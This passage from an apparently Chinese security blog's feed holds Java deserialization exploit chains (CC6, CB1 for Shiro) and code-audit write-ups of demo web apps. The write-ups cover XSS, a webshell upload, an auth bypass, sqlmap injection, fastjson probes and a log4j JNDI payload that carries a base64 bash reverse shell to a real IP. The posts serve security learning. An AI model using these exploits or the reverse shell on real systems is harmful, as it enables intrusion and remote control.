class="hljs-string">&quot;Calc&quot;</span>);<br>    setFiled(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>    setFiled(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>    <span class="hljs-comment">// 构造cc3后半段 去调用TemplatesImpl#newTransformer方法</span><br>    <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br>    <span class="hljs-comment">// cc6</span><br>    HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;hello&quot;</span>));<br><br>    <span class="hljs-comment">// 传入lazyMap 和 对应的key 这个key后面需要移除</span><br>    <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, templates);<br><br>    HashMap&lt;Object, Object&gt; expHashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    <span class="hljs-comment">// put方法会执行getValue方法</span><br>    expHashMap.put(tiedMapEntry, <span class="hljs-string">&quot;sdfdsf&quot;</span>);<br><br>    <span class="hljs-comment">// 删除key 目的为了反序列化的时候走factory.transform(key); --&gt; 这里就是</span><br>    map.remove(templates);<br><br>    Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>    factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>    factoryField.set(lazyMap, invokerTransformer);<br><br>    SerializeUtil.serialize(expHashMap);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(TemplatesImpl templates, String filedName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> templates.getClass().getDeclaredField(filedName);<br>    declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>    declaredField.set(templates, value);<br>&#125;<br></code></pre></td></tr></table></figure><p>主要逻辑是调用了put方法，然后会调用<code>tiedMapEntry</code>的hash方法，最终会调用<code>getVaule</code>方法。</p><p><code>getVaule</code>方法中会调用<code>get</code>方法。由于我们传入的<code>TiedMapEntry</code>的key是<code>LazyMap</code>，<code>TiedMapEntry</code>的<code>getVaule</code>会调用<code>LazyMap</code>的<code>get</code>方法。</p><p><code>LazyMap</code>中的<code>factory</code>是我们传入的<code>InvokerTransformer</code>，因此会调用对应的<code>transform</code>方法，该形参<code>key</code>是<code>TemplatesImpl</code>。<br><img src="E:\blog\source\blog_image\image-20240528094210278.png" alt="image-20240528094210278"></p><p>因此最终会调用到<code>InvokerTransformer</code>的<code>transform</code>方法，这个方法很熟悉了，就是我们需要调用的<code>TemplatesImple</code>的<code>newTransformer</code>。这个方法最终会调用到<code>TemplatesImple</code>的<code>defineClass</code>方法。从而造成了加载恶意class。</p><p><img src="E:\blog\source\blog_image\image-20240528094215912.png" alt="image-20240528094215912"></p><p>调用流程如图所示：</p><p><img src="E:\blog\source\blog_image\image-20240528094223059.png" alt="image-20240528094223059"></p><h2 id="CB1-原生链："><a href="#CB1-原生链：" class="headerlink" title="CB1 原生链："></a>CB1 原生链：</h2><p>CB链不用我多说了，PropertyUtils.getProperty会反射调用对应的get方法，和fastjson一样。然后我们需要找的哪个类调用了<code>getProperty</code>。</p><p>在java中的原生类消息队列<code>PriorityQueue</code>的compare会调用<code>getProperty</code>方法。</p><p>poc如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\serialize\\cc3\\target\\classes\\Calc.class&quot;</span>));<br>    setFiled(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);<br>    setFiled(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>    setFiled(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>    <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>    <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>    <span class="hljs-comment">// 传入一个没有用的比较器</span><br>    PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br><br>    queue.add(templates);<br>    queue.add(<span class="hljs-number">1</span>);<br><br>    Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">PriorityQueue</span>&gt; queueClass = queue.getClass();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">sizeFiled</span> <span class="hljs-operator">=</span> queueClass.getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>    sizeFiled.setAccessible(<span class="hljs-literal">true</span>);<br>    sizeFiled.set(queue,<span class="hljs-number">2</span>);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">comparatorFiled</span> <span class="hljs-operator">=</span> queueClass.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>    comparatorFiled.setAccessible(<span class="hljs-literal">true</span>);<br>    comparatorFiled.set(queue,beanComparator);<br><br><br>    SerializeUtil.serialize(queue);<br>    SerializeUtil.unSerialize();<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(Object object, String filedName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(filedName);<br>    declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>    declaredField.set(object, value);<br>&#125;<br></code></pre></td></tr></table></figure><p>传参后发送，发现报错，如下：</p><p><img src="E:\blog\source\blog_image\image-20240528094232284.png" alt="image-20240528094232284"></p><p>原因：</p><blockquote><p>如果两个不同版本的库使用了同一个类，而这两个类可能有一些方法和属性有了变化，此时在序列化通信的时候就可能因为不兼容导致出现隐患。因此，Java在反序列化的时候提供了一个机制，序列化时会根据固定算法计算出一个当前类的 <code>serialVersionUID</code> 值，写入数据流中；反序列化时，如果发现对方的环境中这个类计算出的 <code>serialVersionUID</code> 不同，则反序列化就会异常退出，避免后续的未知隐患。</p></blockquote><p>那我们就修改版本，和shiro一样的版本，将版本修改为<code>1.8.3</code>。</p><p>修改后我再打！发现又报错了：</p><p><img src="E:\blog\source\blog_image\image-20240528094236541.png" alt="image-20240528094236541"></p><p>这段的意思是，不能加载cc依赖中的<code>ComparableComparator</code>，因为cb在设计之初就依赖cc链。</p><p>可以看到<code>BeanComparator</code>的构造函数，传入了一个cc链的<code>ComparableComparator</code>。</p><p><img src="E:\blog\source\blog_image\image-20240528094243157.png" alt="image-20240528094243157"></p><p>那么我们不要这个依赖cc链的构造函数，换成其他的就行了。</p><p>查看另一个构造函数，我们可以传入jdk原生的比较器，或者其他比较器就可以了。</p><p><img src="E:\blog\source\blog_image\image-20240528094247799.png" alt="image-20240528094247799"></p><p>以上的类都可以考虑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_file</span>(<span class="hljs-params">file_path</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf8&#x27;</span>) <span class="hljs-keyword">as</span> file:  <span class="hljs-comment"># 指定使用 gbk 编码打开文件</span><br>        content = file.readlines()<br>    <span class="hljs-comment"># 返回文件内容的集合，使用集合去除重复项</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">set</span>(content)<br><br><span class="hljs-comment"># 两个文件的路径</span><br>file1_path = <span class="hljs-string">&#x27;compart.txt&#x27;</span><br>file2_path = <span class="hljs-string">&#x27;serializable.txt&#x27;</span><br><br><span class="hljs-comment"># 读取文件内容</span><br>file1_content = read_file(file1_path)<br>file2_content = read_file(file2_path)<br><br><span class="hljs-comment"># 找到两个文件内容的交集</span><br>intersection = file1_content.intersection(file2_content)<br><br><span class="hljs-comment"># 打印交集内容</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;文件1和文件2的交集:&quot;</span>)<br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> intersection:<br>    <span class="hljs-built_in">print</span>(item.strip())  <span class="hljs-comment"># 去除换行符并打印交集内容</span><br><br></code></pre></td></tr></table></figure><p><img src="E:\blog\source\blog_image\image-20240528094255235.png" alt="image-20240528094255235"></p><p>就用第一个了：</p><p><img src="E:\blog\source\blog_image\image-20240528094259709.png" alt="image-20240528094259709"></p><p>修改poc，new一个<code>AttrCompare</code>的比较器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\serialize\\cc3\\target\\classes\\Calc.class&quot;</span>));<br>    setFiled(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);<br>    setFiled(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>    setFiled(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>    <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br><br>    <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>    <span class="hljs-comment">// 传入一个没有用的比较器</span><br>    PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br><br>    queue.add(templates);<br>    queue.add(<span class="hljs-number">1</span>);<br><br>    Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">PriorityQueue</span>&gt; queueClass = queue.getClass();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">sizeFiled</span> <span class="hljs-operator">=</span> queueClass.getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>    sizeFiled.setAccessible(<span class="hljs-literal">true</span>);<br>    sizeFiled.set(queue,<span class="hljs-number">2</span>);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">comparatorFiled</span> <span class="hljs-operator">=</span> queueClass.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>    comparatorFiled.setAccessible(<span class="hljs-literal">true</span>);<br>    comparatorFiled.set(queue,beanComparator);<br><br><br>    SerializeUtil.serialize(queue);<br>    SerializeUtil.unSerialize();<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(Object object, String filedName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(filedName);<br>    declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>    declaredField.set(object, value);<br>&#125;<br></code></pre></td></tr></table></figure><p>本地测试可以弹出计算器，试试在shiro中，成功回显。</p><p><img src="E:\blog\source\blog_image\image-20240528094309195.png" alt="image-20240528094309195"></p><h1 id="坑点："><a href="#坑点：" class="headerlink" title="坑点："></a>坑点：</h1><p>这里使用插件可以查看到存在cc依赖，如图所示：</p><p><img src="E:\blog\source\blog_image\image-20240528094312764.png" alt="image-20240528094312764"></p><p>但是在maven中test不会被编译进去的。这里可以打cb：</p><p><img src="E:\blog\source\blog_image\image-20240528094316083.png" alt="image-20240528094316083"></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
      <category>中间件</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>shiro</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tmail代码审计</title>
    <link href="/2024/04/15/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Tmail%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2024/04/15/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Tmail%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="配置环境："><a href="#配置环境：" class="headerlink" title="配置环境："></a>配置环境：</h1><h1 id="前台："><a href="#前台：" class="headerlink" title="前台："></a>前台：</h1><h2 id="1-xss："><a href="#1-xss：" class="headerlink" title="1.xss："></a>1.xss：</h2><h3 id="前台搜索xss："><a href="#前台搜索xss：" class="headerlink" title="前台搜索xss："></a>前台搜索xss：</h3><p>访问:<code>vps:8088/tmall/</code>前台服务，搜索处存在xss。</p><p><img src="/../../blog_image/image-20240226101005227.png" alt="image-20240226101005227"></p><h3 id="用户信息修改xss："><a href="#用户信息修改xss：" class="headerlink" title="用户信息修改xss："></a>用户信息修改xss：</h3><p><img src="/../../blog_image/image-20240226102710525.png" alt="image-20240226102710525"></p><p>提交后，后台管理处可以弹出xss。</p><p><img src="/../../blog_image/image-20240226102635489.png" alt="image-20240226102635489"></p><p>之后我们可以利用xss接受平台接受信息。</p><p>不会利用。</p><h2 id="2-文件上传："><a href="#2-文件上传：" class="headerlink" title="2.文件上传："></a>2.文件上传：</h2><p>用户个人信息修改中存在任意文件上传。</p><p>上传后的文件路径在：</p><p><code>/tmall/res/images/item/userProfilePicture/文件名</code>目录下</p><p><img src="/../../blog_image/image-20240227094443059.png" alt="image-20240227094443059"></p><p>直接bp抓包后放行，没有过滤后缀：</p><p><img src="/../../blog_image/image-20240227100354405.png" alt="image-20240227100354405"></p><p>默认密码是<code>rebeyond</code></p><p><img src="/../../blog_image/image-20240227100727481.png" alt="image-20240227100727481"></p><p>实现逻辑中没有对上传的文件后缀进行过滤。</p><p><img src="/../../blog_image/image-20240227100935616.png" alt="image-20240227100935616"></p><h1 id="后台："><a href="#后台：" class="headerlink" title="后台："></a>后台：</h1><h2 id="1-登陆权限绕过："><a href="#1-登陆权限绕过：" class="headerlink" title="1.登陆权限绕过："></a>1.登陆权限绕过：</h2><p>在获取用户信息中，我们需要管理员进行登录操作，才能查看的，如下图：</p><p><img src="/../../blog_image/image-20240227135353622.png" alt="image-20240227135353622"></p><p>将cookie删除了就会重定向登陆页面：</p><p><img src="/../../blog_image/image-20240227135424814.png" alt="image-20240227135424814"></p><p>一般项目中都会在filter中做权限校验，要么在struct中做权限校验，查看filter拦截器：</p><p><img src="/../../blog_image/image-20240227135535811.png" alt="image-20240227135535811"></p><p>主要获取当前url然后判断url中是否存在<code>/admin/login</code>或者是<code>/admin/account</code>目录，如果存在则放行，不存在校验权限。</p><p>因此我们可以知道存在<code>/admin/login</code>或者是<code>/admin/account</code>目录的都会被放行。</p><p>这个时候我们可以尝试使用<code>../..</code>的方式去绕过。如<code>/xxx/../aa/bb</code>这样的目录，tomcat接收到的实际路径是<code>/aa/bb</code>，这就能够直接绕过filter的权限校验了。</p><p>因此我们可以构造payload：<code>/admin/login/../../tmall/admin/user</code>，这样就会被解析成<code>/tmall/admin/user</code>，这就可以绕过filter的校验了。</p><p><strong>SpringBoot(Tomcat)和Shiro对URL处理的差异化</strong></p><table><thead><tr><th>漏洞编号</th><th>CVE-2020-1957</th><th>CVE-2020-11989</th><th>CVE-2020-13933</th></tr></thead><tbody><tr><td>影响版本</td><td>Apache Shiro &lt; 1.5.1</td><td>Apache Shiro &lt; 1.5.2</td><td>Apache Shiro &lt; 1.6</td></tr><tr><td>payload</td><td>&#x2F;xxxx&#x2F;..;&#x2F;admin&#x2F;</td><td>&#x2F;;&#x2F;test&#x2F;admin&#x2F;page</td><td>&#x2F;admin&#x2F;;page</td></tr><tr><td>Shrio 处理结果</td><td>&#x2F;xxxx&#x2F;..</td><td>&#x2F;</td><td>&#x2F;admin&#x2F;</td></tr><tr><td>SpringBoot 处理结果</td><td>&#x2F;admin&#x2F;</td><td>&#x2F;admin&#x2F;page</td><td>&#x2F;admin&#x2F;;page</td></tr></tbody></table><p>这表中对于<code>CVE-2020-1957</code>我们的路径是<code>/xxx/..;/admin/</code>，那么shiro实际获取的参数是<code>/xxxx/..</code>，而springboot获取的实际参数是<code>/admin</code>，这样我们就饶过了shiro层，从而路由到springboot对应的controller层了，这样就绕过了权限校验。</p><h2 id="2-查询sql注入："><a href="#2-查询sql注入：" class="headerlink" title="2.查询sql注入："></a>2.查询sql注入：</h2><p>一般的springboot都可能会存在的注入点：</p><blockquote><ol><li>order by</li><li>like</li></ol></blockquote><p>like预防的措施是<code>concat(&#39;$&#39;,参数，&#39;$&#39;)</code></p><p><img src="/../../blog_image/image-20240227140351119.png" alt="image-20240227140351119"></p><p>选择文件掩码为<code>*.xml</code>，然后搜索<code>$&#123;</code>为未预编译的。</p><p><img src="/../../blog_image/image-20240227141914964.png" alt="image-20240227141914964"></p><p>往上查找：</p><p><img src="/../../blog_image/image-20240227141929940.png" alt="image-20240227141929940"></p><p>查找到对应的controller：</p><p><img src="/../../blog_image/image-20240227142008592.png" alt="image-20240227142008592"></p><p>找到orderby字段是可控的。</p><p>可以直接上sqlmap：</p><p>使用<code>-p</code>指定<code>orderBy</code>参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">py .\sqlmap.py -u <span class="hljs-string">&quot;http://127.0.0.1:8088/tmall/admin/reward/0/10?orderBy=1&quot;</span> --cookie=<span class="hljs-string">&quot;JSESSIONID=096556EF4FC62BBE700F04AC75D3E587; username=admin&quot;</span> -p <span class="hljs-string">&quot;orderBy&quot;</span> --current-db<br></code></pre></td></tr></table></figure><p><img src="/../../blog_image/image-20240227143553007.png" alt="image-20240227143553007"></p><p>还有很多的注入点，方法类似，主要是从dao层网上查找，需要注意的是orderby字段是否是可控的。</p><h2 id="3-管理员头像文件上传："><a href="#3-管理员头像文件上传：" class="headerlink" title="3.管理员头像文件上传："></a>3.管理员头像文件上传：</h2><p>和前台一样。</p><p>但是这里需要知道的是正常来说，Springboot项目是不能够解析JSP文件的，这里能够解析，是因为引入了jstl和jasper依赖。所以，对于前后端分离的springboot项目，即使上传了马子，也没办法解析。</p><h2 id="4-fastjson组件漏洞："><a href="#4-fastjson组件漏洞：" class="headerlink" title="4.fastjson组件漏洞："></a>4.fastjson组件漏洞：</h2><p>查找到使用fastjson的地方，搜索<code>json.parse</code></p><p>payload如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet6Address&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;sdffsd.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.InetAddress&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1247.xxxxx.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;wefewffw.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/../../blog_image/image-20240227150241688.png" alt="image-20240227150241688"></p><p>成功收到dns：</p><p><img src="/../../blog_image/image-20240227150146555.png" alt="image-20240227150146555"></p><p>但是以上payload只能证明fastjson出网，无法判断fastjson是否存在反序列化漏洞，因为最新的打了补丁的fastjson也是能发起DNS请求的。这是很多新手，误以为能DNS出网，就认为存在fastjson漏洞，这是不正确的。</p><h2 id="5-log4j2漏洞："><a href="#5-log4j2漏洞：" class="headerlink" title="5.log4j2漏洞："></a>5.log4j2漏洞：</h2><p>全文搜索<code>logger.</code></p><p>在文件上传中可以找到：</p><p><img src="/../../blog_image/image-20240229100100998.png" alt="image-20240229100100998"></p><p>dnslog检测：</p><p><img src="/../../blog_image/image-20240227155008357.png" alt="image-20240227155008357"></p><p><img src="/../../blog_image/image-20240227155013754.png" alt="image-20240227155013754"></p><p>本地使用工具：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i vps的ip<br></code></pre></td></tr></table></figure><p>然后传入参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$&#123;jndi:ldap://x.x.x.x:1389/Basic/Command/Base64/base64编码后的命令&#125;</span><br></code></pre></td></tr></table></figure><p>即：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$&#123;jndi:ldap://47.96.111.156:1389/Basic/Command/Base64/L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzQ3Ljk2LjExMS4xNTYvNTU1NSAwPiYx&#125;</span><br></code></pre></td></tr></table></figure><p>vps上监听5555端口</p><p>重新发送数据包</p><p><img src="/../../blog_image/image-20240229100322670.png" alt="image-20240229100322670"></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FEBS后台管理系统代码审计</title>
    <link href="/2024/03/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/FEBS%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2024/03/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/FEBS%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="环境准备："><a href="#环境准备：" class="headerlink" title="环境准备："></a>环境准备：</h1><h2 id="下载源码："><a href="#下载源码：" class="headerlink" title="下载源码："></a>下载源码：</h2><p>下载文件<a href="https://github.com/jackliu-hao/shiro_boot----">jackliu-hao&#x2F;shiro_boot—-: shiro_boot代码审计 (github.com)</a></p><h2 id="Oracle安装："><a href="#Oracle安装：" class="headerlink" title="Oracle安装："></a>Oracle安装：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it -p 1521:1521 \--name oracle11g \registry.cn-hangzhou.aliyuncs.com/helowin/oracle_11g <br></code></pre></td></tr></table></figure><p>进入容器<code>docker exec oracle_11g -it bash </code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#进入容器</span><br>su root  <span class="hljs-comment">#密码 helowin</span><br><span class="hljs-comment">#编辑profile文件配置ORACLE环境变量:</span><br>vi /etc/profile  <br><span class="hljs-comment">#添加如下内容</span><br><span 